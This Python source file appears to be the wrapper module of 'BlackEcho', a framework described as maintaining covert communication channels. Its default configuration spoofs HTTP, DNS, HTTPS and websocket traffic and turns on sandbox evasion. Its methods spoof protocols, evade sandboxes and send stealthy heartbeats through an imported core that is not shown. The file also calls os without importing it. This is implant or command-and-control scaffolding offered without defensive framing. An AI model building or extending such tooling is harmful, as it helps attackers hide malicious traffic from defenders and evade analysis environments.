"""
BlackEcho Module
Provides stealth framework for maintaining covert communication channels
"""
import logging
import threading
from typing import Dict, Any, Optional

# Import core components
try:
    from .stealth_core import StealthCore
except ImportError:
    # For standalone testing
    from stealth_core import StealthCore

# Set up module logger
logger = logging.getLogger("BlackEcho")
logger.setLevel(logging.INFO)


class BlackEcho:
    """Main class for BlackEcho stealth framework"""
    
    def __init__(self, config_path: Optional[str] = None, config_dict: Optional[Dict[str, Any]] = None):
        """Initialize the BlackEcho system
        
        Args:
            config_path: Path to configuration file (optional)
            config_dict: Configuration dictionary (optional, takes precedence over config_path)
        """
        self.logger = logger
        
        # Load configuration
        if config_dict:
            self.config = config_dict
        elif config_path:
            self.config = self._load_config(config_path)
        else:
            # Look for default config paths
            default_paths = [
                "blackecho/stealth_config.yaml",
                "config/stealth_config.yaml",
                "stealth_config.yaml"
            ]
            
            for path in default_paths:
                if os.path.exists(path):
                    self.config = self._load_config(path)
                    break
            else:
                # No config found, use default minimal config
                self.config = {
                    "spoofed_protocols": ["http", "dns", "https", "websocket"],
                    "sandbox_evasion": True,
                    "heartbeat_interval": 60,
                    "encryption_key": None
                }
                self.logger.warning("No configuration found, using minimal default configuration")
        
        # Initialize Stealth Core
        self.stealth_core = StealthCore(self.config)
        
        # Control variables
        self.running = False
        self.thread = None
        
    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from file
        
        Args:
            config_path: Path to the configuration file
            
        Returns:
            Configuration dictionary
        """
        try:
            import yaml
            with open(config_path, 'r') as f:
                config = yaml.safe_load(f)
                
            self.logger.debug(f"Loaded configuration from {config_path}")
            return config
        except Exception as e:
            self.logger.error(f"Error loading configuration from {config_path}: {e}")
            return {}
    
    def start(self):
        """Start the BlackEcho system"""
        if self.running:
            return
            
        self.running = True
        
        # Start Stealth Core in a separate thread
        self.thread = threading.Thread(target=self.stealth_core.run)
        self.thread.daemon = True
        self.thread.start()
        
        self.logger.info("BlackEcho system started")
    
    def stop(self):
        """Stop the BlackEcho system"""
        if not self.running:
            return
            
        self.running = False
        
        # Stop Stealth Core
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=5.0)
        
        self.logger.info("BlackEcho system stopped")
    
    def spoof_protocol(self, protocol: str, data: bytes) -> bytes:
        """Spoof protocol communication
        
        Args:
            protocol: Protocol to spoof
            data: Data to send
            
        Returns:
            Spoofed data
        """
        return self.stealth_core.spoof_protocol(protocol, data)
    
    def evade_sandbox(self) -> bool:
        """Perform sandbox evasion techniques
        
        Returns:
            True if evasion successful, False otherwise
        """
        return self.stealth_core.evade_sandbox()
    
    def send_heartbeat(self, session_id: str, status: str) -> bool:
        """Send stealthy heartbeat signal
        
        Args:
            session_id: Session identifier
            status: Status message
            
        Returns:
            True if heartbeat sent successfully, False otherwise
        """
        return self.stealth_core.send_heartbeat(session_id, status)


# Create a singleton instance
def create_instance(config_path=None, config_dict=None):
    """Create a new BlackEcho instance
    
    Args:
        config_path: Path to configuration file (optional)
        config_dict: Configuration dictionary (optional)
        
    Returns:
        BlackEcho instance
    """
    return BlackEcho(config_path, config_dict)


if __name__ == "__main__":
    # Setup logging for standalone mode
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Create and start BlackEcho
    blackecho = create_instance()
    blackecho.start()
    
    try:
        # Keep the main thread running
        import time
        print("BlackEcho started, press Ctrl+C to stop")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping...")
    finally:
        blackecho.stop()